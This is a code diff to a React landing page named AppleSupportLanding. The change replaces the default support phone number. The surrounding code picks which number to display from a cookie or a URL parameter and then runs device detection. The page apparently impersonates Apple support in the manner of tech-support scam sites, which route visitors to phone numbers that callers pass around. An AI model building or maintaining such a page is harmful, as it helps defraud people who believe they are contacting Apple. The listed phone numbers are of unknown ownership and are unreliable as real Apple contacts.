@@ -43,7 +43,7 @@ const cookieHelper = {
 };
 
 const AppleSupportLanding = () => {
-  const [phone, setPhone] = useState('+1(888)339-6578');
+  const [phone, setPhone] = useState('+1(877)489-0871');
   const [displayText, setDisplayText] = useState('');
   const resultRef = useRef(null);
 
@@ -66,7 +66,7 @@ const AppleSupportLanding = () => {
     // 1. Phone Resolution
     const paramPhone = urlParams.get('phone');
     const cookiePhone = cookieHelper.get('phoneSetBl');
-    const activePhone = cookiePhone || paramPhone || '+1(888)339-6578';
+    const activePhone = cookiePhone || paramPhone || '+1(877)489-0871';
     setPhone(activePhone);
 
     // 2. Device Detection
